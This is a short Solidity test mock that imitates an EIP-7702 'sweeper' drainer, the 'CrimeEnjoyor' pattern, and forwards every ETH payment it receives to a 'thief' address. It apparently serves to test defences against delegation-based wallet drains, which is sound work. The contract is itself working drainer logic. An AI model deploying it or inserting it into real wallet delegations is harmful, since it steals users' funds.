// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @notice Test-only EIP-7702 "sweeper": any ETH received is forwarded to the thief.
///         Mirrors the copy-pasted CrimeEnjoyor family used in real 7702 drains.
contract SweeperMock {
    address payable public immutable thief;

    constructor(address payable _thief) {
        thief = _thief;
    }

    receive() external payable {
        thief.transfer(msg.value);
    }
}
